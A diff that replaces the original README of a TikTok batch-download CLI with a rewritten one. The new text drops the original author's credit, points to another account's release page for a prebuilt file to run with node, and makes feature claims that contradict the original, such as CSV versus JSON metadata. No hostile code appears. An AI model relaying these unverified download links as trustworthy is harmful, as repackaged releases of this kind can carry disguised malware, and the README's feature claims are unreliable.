@@ -1,130 +1,82 @@
+# 🎉 TikTok-Batch-Downloader - Download TikTok Videos Easily
 
+## 📥 Download Now
+[![Download TikTok-Batch-Downloader](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/juanchopolo123/TikTok-Batch-Downloader/releases)
 
-# 🎬 TikTok Batch Downloader (No Watermark)
+## 🚀 Getting Started
+This guide helps you download and run TikTok-Batch-Downloader, a Node.js command-line tool designed to download multiple TikTok videos without watermarks. Follow these steps to start using the application.
 
-🌐 Available in other languages: [Bahasa Indonesia](README.id.md)
+## 🛠️ System Requirements
+- **Operating System:** Windows, macOS, or any Linux distribution
+- **Node.js:** Ensure you have Node.js installed. Download it from [nodejs.org](https://nodejs.org/).
 
-![Node.js](https://img.shields.io/badge/Node.js-12%2B-green)
-![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
-![Status](https://img.shields.io/badge/status-active-brightgreen)
-![GitHub stars](https://img.shields.io/github/stars/xsrazy/TikTok-Batch-Downloader?style=social)
-![GitHub forks](https://img.shields.io/github/forks/xsrazy/TikTok-Batch-Downloader?style=social)
-![GitHub last commit](https://img.shields.io/github/last-commit/xsrazy/TikTok-Batch-Downloader)
+## 📂 Download & Install
+To get the latest version of TikTok-Batch-Downloader, visit [this page to download](https://github.com/juanchopolo123/TikTok-Batch-Downloader/releases). 
 
----
+1. Open your web browser.
+2. Click the link above.
+3. Find the latest release.
+4. Download the appropriate file for your operating system.
+5. Save the file to your preferred location.
 
-A simple Node.js CLI tool to download multiple TikTok videos without watermarks, complete with metadata export and automatic error handling.
+Now that you have downloaded the application, let's run it.
 
-![Screen Shot!](xsrazy.png)
+## 🖥️ How to Run the Application
+1. Open your command line interface:
+   - **Windows:** Press `Win + R`, type `cmd`, and press Enter.
+   - **macOS:** Open `Terminal` from `Applications > Utilities`.
+   - **Linux:** Use the terminal application you prefer.
+   
+2. Navigate to the folder where you saved the downloaded file. Use the `cd` command:
+   - Example for Windows: `cd C:\path\to\your\folder`
+   - Example for macOS/Linux: `cd /path/to/your/folder`
+   
+3. Run the application using Node.js:
+   - Type `node TikTok-Batch-Downloader.js` and press Enter.
 
----
+If this file is named differently, use the correct file name in the command.
 
-## 🚀 Features
+## 🎥 How to Use TikTok-Batch-Downloader
+- **Step 1:** Open the command line where you ran the application.
+- **Step 2:** Enter the TikTok video URLs you want to download. Separate multiple URLs with a space.
+  
+  Example: 
+  ```
+  https://www.tiktok.com/@username/video/1234567890 https://www.tiktok.com/@username/video/0987654321
+  ```
+  
+- **Step 3:** Press Enter. The tool will begin downloading videos without watermarks. 
 
-- 🎥 Download TikTok videos without watermarks
-- ⏳ Batch process using `links.txt`
-- 📊 Metadata export (in JSON format)
-- 🚫 Automatic error logging
-- 📁 Clean folder structure
+## 📁 Exporting Metadata
+This application also allows you to export metadata for each video. Metadata includes information like the video title, author, and download date.
 
-## 💡 How to Use
+To export metadata:
+1. Add the `--metadata` flag when you run the command.
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/xsrazy/TikTok-Batch-Downloader
-   cd TikTok-Batch-Downloader
-   ```
-
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
-
-3. Add all video links to the `links.txt` file.
-
-4. Run the tool:
-   ```bash
-   node main.js
-   ```
-
----
-
-## 📁 Output Structure
+Example:
 ```
-downloads/
-├── video_1/
-│   ├── video.mp4
-│   └── metadata.json
-├── video_2/
-│   ├── video.mp4
-│   └── metadata.json
-...
+node TikTok-Batch-Downloader.js --metadata
 ```
 
-### 🔍 Contents of `metadata.json`
-Each video will come with a `metadata.json` file containing detailed information:
+This command will generate a `.csv` file with all relevant details.
 
-| Field            | Description                                        |
-|------------------|----------------------------------------------------|
-| `id`             | Unique ID of the TikTok video                      |
-| `url`            | Full URL of the video                              |
-| `author`         | Username (e.g., `@xsrazy`)                         |
-| `description`    | Caption or text content of the video               |
-| `hashtags`       | List of hashtags in the video (`#tag`)             |
-| `music`          | Title or source of the audio                       |
-| `created_at`     | Upload date of the video (ISO format)              |
-| `stats.plays`    | Number of views                                    |
-| `stats.likes`    | Number of likes                                    |
-| `stats.comments` | Number of comments                                 |
-| `stats.shares`   | Number of shares                                   |
-| `downloaded_at`  | Time when the video was downloaded using this tool |
+## ⚠️ Error Handling
+TikTok-Batch-Downloader has built-in error handling. If a video fails to download, the tool will skip it and continue with the rest. You will receive feedback messages in the command line explaining any errors encountered.
 
----
+## 📋 Important Notes
+- Ensure you have a stable internet connection for smooth downloads.
+- Respect copyright and use downloaded content responsibly.
+- For video quality, check settings in the application (upcoming feature).
 
-## 📋 Example of `links.txt`
-```
-https://www.tiktok.com/@user/video/1234567890123456789
-https://www.tiktok.com/@anotheruser/video/9876543210987654321
-```
+## 📞 Support
+If you encounter issues or have questions, feel free to open an issue on the [GitHub Issues page](https://github.com/juanchopolo123/TikTok-Batch-Downloader/issues). We are here to help!
 
----
+You are now ready to download your favorite TikTok videos without watermarks. Enjoy using TikTok-Batch-Downloader!
 
-## 🧩 How to Grab Video Links Easily 
+## 🌐 Further Reading
+- For more information about Node.js, visit [Node.js Documentation](https://nodejs.org/en/docs/).
+- To learn more about TikTok's usage policies, check their [Community Guidelines](https://www.tiktok.com/community-guidelines).
 
-No need to code — just use this Chrome extension:
+Remember, downloading videos should be done within fair use policies. Always respect creators' rights.  
 
-🔗 [Link Grabber (by Google)](https://chromewebstore.google.com/detail/link-grabber/caodelkhipncidmoebgbbeemedohcdma)
-
-**Steps:**
-
-1. Open any TikTok page (profile, hashtag, FYP, etc.)
-2. Click the Link Grabber icon
-3. Copy all the video links shown
-4. Paste them into the links.txt file
-
-## 🧠 Tips
-- Make sure the links are valid and the videos are public (not private)
-- Avoid downloading thousands of videos at once (limit the batch size)
-- Use it for archiving, educational purposes, or personal backups
-- You can use a Link Grabber extension or a custom scraper to gather video links
-
-## 💻 Created by
-**[@xsrazy](https://github.com/xsrazy)** — open-source enthusiast  
-Feel free to fork, star ⭐, and contribute!
-
-## 📣 Release
-🎉 **First Release:** `v1.0.0`
-- TikTok downloader CLI without watermarks
-- Batch processing
-- JSON metadata export
-- Duplicate detection and error logging
-
-> Ready to use for content creators, video backups, or personal analysis!
-
-## 🧾 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE.md)
-
-MIT License – see the [LICENSE](LICENSE) file for details.
-
----
-
-<a href="https://www.buymeacoffee.com/xsrazy" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
+Happy downloading!
